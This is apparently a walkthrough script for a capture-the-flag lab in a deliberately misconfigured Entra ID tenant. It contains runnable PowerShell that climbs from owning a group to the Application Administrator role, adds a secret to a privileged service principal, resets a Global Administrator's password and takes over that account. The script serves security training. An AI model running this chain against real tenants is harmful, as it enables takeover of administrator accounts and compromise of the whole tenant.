<#
.SYNOPSIS
EntraGoat Scenario 3: Walkthrough solution step-by-step

.DESCRIPTION
________________________________________________________________________________________________________________________________________________
Scenario 3 - Group Ownership Privilege Escalation Chain
Group-Ownership -> App Admin -> SP -> PAA -> GA

Attack flow: 

1. The attacker starts as a low-privileged IT support user (Michael Chen).
Through a misconfiguration, this user owns multiple security groups - some with administrative roles assigned and others as normal groups without roles.

2. Since group owners can manage group membership, the attacker can add themselves to any of these groups.
No approval needed - group ownership means full control over membership. This gives them access to multiple privileged roles from the groups that have roles assigned.

3. With Application Administrator role (from IT Application Managers group), the attacker can manage ALL application registrations and service principals in the tenant.
This includes adding credentials to any service principal - a powerful capability often overlooked.

4. The attacker discovers a service principal that's a member of another group with Privileged Authentication Administrator (PAA) role.
This creates a privilege escalation chain: Group Owner -> App Admin -> SP -> PAA.

5. The attacker adds credentials to this SP and authenticates as it.

6. Using these privileges, the attacker resets the Global Administrator's password.
PAA can reset passwords for any user, including Global Admins.

7. The attacker logs in as the Global Administrator and retrieves the flag.
Complete tenant compromise achieved through a chain of legitimate but misconfigured permissions.

- - - 

--> So... why this works?
This attack exploits several common misconfigurations and oversight issues:

1. Group Ownership is Powerful: Many organizations don't realize that group owners have full control over membership.
   When these groups have privileged roles, ownership becomes a backdoor to those privileges.

2. Role-Assignable Groups: The ability to assign roles to groups is convenient but dangerous.
   It creates indirect paths to privileges that are harder to audit and track.

3. Application Administrator Scope: This role can manage ALL applications, not just owned ones.
   It's often given out thinking it's limited, but it's actually extremely powerful.

4. Service Principal Group Membership: SPs can be members of groups with roles, creating non-obvious privilege paths.
   Many admins focus on user memberships and forget about service principals - the function Get-MgGroupMember doesn't even show SPs on v1.0

Common scenarios where this happens:
- IT support teams given group ownership for "self-service" management
- Old service principals added to admin groups and forgotten
- Role-assignable groups created without proper governance
- Application Administrator role given to development teams

The attack is particularly dangerous because:
- Each individual part seems reasonable in isolation
- The privilege chain can be challenging to spot in large environments
- All actions use legitimate APIs and permissions
________________________________________________________________________________________________________________________________________________

.NOTES
Requires: Get-MSGraphTokenWithUsernamePassword function from BARK (https://github.com/BloodHoundAD/BARK)
you must have the function/BARK toolkit loaded in PS memory to use this function but other tools such GraphRunner, ROADtools, and AADInternals or simply Connect-MgGraph can be used as well.
#>

# quick wrapper to list all members of a group (handles SPs too - uses /beta)
# as Get-MgGroupMember doesn't show SPs on v1.0, so we use a direct API call instead
function Get-GroupMembers {
    param([string]$GroupId)
    return (Invoke-MgGraphRequest -Uri "/beta/groups/$GroupId/members" -Method GET).value
}

# return all groups a given identity owns and their roles
function Get-GroupsOwnedBy {
    param([string]$UserId)
    
    Write-Host "Enumerating all groups in the tenant..."
    $allGroups = Get-MgGroup -All -Property Id, DisplayName, Description, MailEnabled, SecurityEnabled, GroupTypes, IsAssignableToRole
    Write-Host "Found $($allGroups.Count) groups in tenant"
    
    $ownedGroups = @()
    $checkCount = 0
    
    foreach ($group in $allGroups) {
        $checkCount++
        if ($checkCount % 50 -eq 0) {
            Write-Host "Checked $checkCount/$($allGroups.Count) groups..."
        }
        try {
            $owners = Get-MgGroupOwner -GroupId $group.Id -ErrorAction Stop
            foreach ($owner in $owners) {
                if ($owner.Id -eq $UserId) {
                    # Get assigned roles if applicable
                    $assignedRoles = @()
                    if ($group.IsAssignableToRole) {
                        $assignedRoles = Get-GroupRoles -GroupId $group.Id
                    }

                    # Write-Host "OWNED GROUP FOUND!" -ForegroundColor Red
                    Write-Host "   Name: $($group.DisplayName)" -ForegroundColor Yellow
                    Write-Host "   Group ID: $($group.Id)" -ForegroundColor Yellow
                    
                    if ($assignedRoles) {
                        Write-Host "   Assigned Roles: $($assignedRoles -join ', ')" -ForegroundColor DarkYellow
                    } else {
                        if ($group.IsAssignableToRole) {
                            Write-Host "   Assigned Roles: None (group can be assigned roles)" -ForegroundColor Gray
                        } else {
                            Write-Host "   Assigned Roles: N/A (group cannot be assigned roles)" -ForegroundColor Gray
                        }
                    }

                    $ownedGroups += [PSCustomObject]@{
                        GroupID = $group.Id
                        DisplayName = $group.DisplayName
                        AssignedRoles = $assignedRoles
                    }
                    break  
                }
            }
        }
        catch {
            Write-Host "Error checking owners for group $($group.DisplayName): $_" -ForegroundColor Red
        }
    }
    return $ownedGroups
}

# helper function to get roles assigned to a group
function Get-GroupRoles {
    param([string]$GroupId)
    
    $roles = @()
    try {
        $assignments = Get-MgRoleManagementDirectoryRoleAssignment -Filter "principalId eq '$GroupId'"
        foreach ($a in $assignments) {
            $roleDef = Get-MgRoleManagementDirectoryRoleDefinition -UnifiedRoleDefinitionId $a.RoleDefinitionId
            $roles += $roleDef.DisplayName
        }
    }
    catch {
        Write-Host "Error retrieving roles for group $GroupId : $_" -ForegroundColor DarkYellow
    }
    return $roles
}


$tenantId = "[YOUR-TENANT-ID]"
$UPN = "michael.chen@[YOUR-DOMAIN].onmicrosoft.com"
$password = "GoatAccess!123"

# Step 1: Authentication as the low-privileged user
Connect-MgGraph

# Alternatively, we can use BARK to acquire a delegated graph token via ROPC:
# $userToken = Get-MSGraphTokenWithUsernamePassword -Username $UPN -Password $password -TenantID $tenantId
# $SecureToken = ConvertTo-SecureString $($userToken.access_token) -AsPlainText -Force
# Connect-MgGraph -AccessToken $SecureToken

Get-MgContext

$currentUser = Get-MgUser -Filter "userPrincipalName eq '$UPN'"
$currentUser

# Step 2: Enumeration - discover all groups owned by the current user
$ownedGroups = Get-MgGroup -All | Where-Object {
    (Get-MgGroupOwner -GroupId $_.Id -ErrorAction SilentlyContinue).Id -contains $currentUser.Id
}
$ownedGroups 

# Check if any owned groups are role-assignable and have assigned roles
$ownedGroups | Where-Object { $_.IsAssignableToRole -eq $true }


# since we owned many groups, we can check each one for their assigned roles
$roleGroups = $ownedGroups | Where-Object { $_.IsAssignableToRole -eq $true }

foreach ($group in $roleGroups) {
    $roles = Get-MgRoleManagementDirectoryRoleAssignment -Filter "principalId eq '$($group.Id)'" | 
             ForEach-Object { (Get-MgRoleManagementDirectoryRoleDefinition -UnifiedRoleDefinitionId $_.RoleDefinitionId).DisplayName }
    if ($roles) {
        Write-Host "Group '$($group.DisplayName)' has roles: $($roles -join ', ')" 
    }
}

# Alternatively we can use the fancy custom function Get-GroupsOwnedBy to automate the process of finding all groups owned by the current user
$ownedGroups = Get-GroupsOwnedBy -UserId $currentUser.Id 
$ownedGroups | Format-Table 

# IT Application Managers group has the Application Administrator role! 

# Since we now have the ability to add ourselves to an Application Administrator group, we can manage service principals - including adding new credentials. Time to hunt for high-value SPs.

# Step 4: Building the attack chain
# Note: At this stage, the scenario can be completed by adding a secret to any privileged service principal in the tenant. For this walkthrough, we'll focus on SPs with the Privileged Authentication Administrator (PAA) or Global Administrator (GA) roles, since only these roles can reset a GA's password.

# lets list all SPs in the tenant that have PAA or GA roles assigned
$roleMap = @{
    "62e90394-69f5-4237-9190-012177145e10" = "Global Administrator"
    "7be44c8a-adaf-4e2a-84d6-ab2649e08a13" = "Privileged Authentication Administrator"
}

Get-MgRoleManagementDirectoryRoleAssignment -All |
  Where-Object { $roleMap.Keys -contains $_.RoleDefinitionId } |
  ForEach-Object  { Get-MgServicePrincipal -ServicePrincipalId $_.PrincipalId -ErrorAction SilentlyContinue } |
  Sort-Object Id -Unique |
  Select-Object DisplayName, AppId, Id

# None are returned.

# BUT that's not the complete set of SPs with PAA or GA privileges. We need to enumerate each group holding these roles and identify which of their members are service principals.
# first we'll find all groups that have PAA or GA roles assigned
$allRoleGroups = Get-MgGroup -All -Filter "isAssignableToRole eq true"
$privilegedGroups = @()
foreach ($group in $allRoleGroups) {
    $roles = Get-MgRoleManagementDirectoryRoleAssignment -Filter "principalId eq '$($group.Id)'" |
             Select-Object -Expand RoleDefinitionId

    if ($roles -contains "62e90394-69f5-4237-9190-012177145e10") {
        Write-Host "$($group.DisplayName) has role: $($roleMap['62e90394-69f5-4237-9190-012177145e10'])" -ForegroundColor Yellow
        $privilegedGroups += $group
    }
    elseif ($roles -contains "7be44c8a-adaf-4e2a-84d6-ab2649e08a13") {
        Write-Host "$($group.DisplayName) has role: $($roleMap['7be44c8a-adaf-4e2a-84d6-ab2649e08a13'])" -ForegroundColor Yellow
        $privilegedGroups += $group
    }
}

# Find SP members in those groups
$targetSPs = @() 
foreach ($group in $privilegedGroups) {
    $members = Get-GroupMembers -GroupId $group.Id
    $spMembers = $members | Where-Object { $_.'@odata.type' -eq '#microsoft.graph.servicePrincipal' }
    foreach ($sp in $spMembers) {
        $targetSPs += [PSCustomObject]@{
            Name = $sp.displayName
            SPId = $sp.id
            AppId = $sp.appId
            GroupName = $group.DisplayName
        }
    }
}
$targetSPs

# depending on your environment, you may have many SPs with PAA or GA roles assigned. 
# We can simply pick the first one ($targetSPs[0]) but for the sake of the scenario, and to keep the same solution for all players, 
# we'll focus on the SP of "Identity Management Portal" since we know for sure its there (and we dont want to break any env)


# Step 5: Executing the attack path 

# we own IT Application Managers group that has the Application Administrator role
$ITgroup = Get-MgGroup -Filter "displayName eq 'IT Application Managers'" 

# since we own the group, we can add ourselves to it
$memberParams = @{
    "@odata.id" = "https://graph.microsoft.com/v1.0/users/$($currentUser.Id)"
}
New-MgGroupMemberByRef -GroupId $ITgroup.Id -BodyParameter $memberParams

# refresh the context to see the new group membership
Disconnect-MgGraph

$userAccessToken2 = (Get-MSGraphTokenWithUsernamePassword -Username $UPN -Password $password -TenantID $tenantId).access_token
Connect-MgGraph -AccessToken (ConvertTo-SecureString $userAccessToken2 -AsPlainText -Force)

# you can use the parse-JWTToken cmdlet by BARK to see the new roles (wids) assigned to the user
parse-JWTToken $userToken.access_token
# VS
parse-JWTToken $userAccessToken2

$targetSP = $targetSPs | Where-Object { $_.Name -eq "Identity Management Portal" }

$secretDescription = "EntraGoat-Secret-$(Get-Date -Format 'yyyyMMdd-HHmmss')"
$passwordCredential = @{
    DisplayName = $secretDescription
    EndDateTime = (Get-Date).AddYears(1)
}

$newSecret = Add-MgServicePrincipalPassword -ServicePrincipalId $targetSP.SPId -PasswordCredential $passwordCredential

$clientSecret = $newSecret.SecretText # save it
$clientSecret

# Disconnect current session 
Disconnect-MgGraph

$secureSecret = ConvertTo-SecureString $clientSecret -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential($targetSP.AppId, $secureSecret)
Connect-MgGraph -TenantId $tenantId -ClientSecretCredential $credential

# Step 6: Find the target GA user and reset their password
$targetAdminUPN = "EntraGoat-admin-s3@" + ((Get-MgOrganization).VerifiedDomains | Where-Object IsDefault).Name
$adminUser = Get-MgUser -Filter "userPrincipalName eq '$targetAdminUPN'"
$adminUser

$newPassword = "EntraGoat-$(Get-Date -Format 'yyyyMMdd-HHmmss')!"
$newPassword
$passwordProfile = @{
    Password = $newPassword
    ForceChangePasswordNextSignIn = $false
}

Update-MgUser -UserId $adminUser.Id -PasswordProfile $passwordProfile

Disconnect-MgGraph
# Step 7: Authenticate as GA and get flag

$adminToken = Get-MSGraphTokenWithUsernamePassword -Username $adminUser.UserPrincipalName -Password $newPassword -TenantID $tenantId
$SecureAdminToken = ConvertTo-SecureString $($adminToken.access_token) -AsPlainText -Force
Connect-MgGraph -AccessToken $SecureAdminToken

# Verify admin authentication
Get-MgContext

# Retrieve flag to prove successful compromise
Invoke-MgGraphRequest -Uri 'https://graph.microsoft.com/v1.0/me?$select=id,userPrincipalName,onPremisesExtensionAttributes' |
    Select-Object @{n='UPN';e={$_.userPrincipalName}},
                  @{n='Id';e={$_.id}},
                  @{n='Flag';e={$_.onPremisesExtensionAttributes.extensionAttribute1}}

Disconnect-MgGraph

# Don't forget to run the cleanup script to restore the tenant to it's original state!
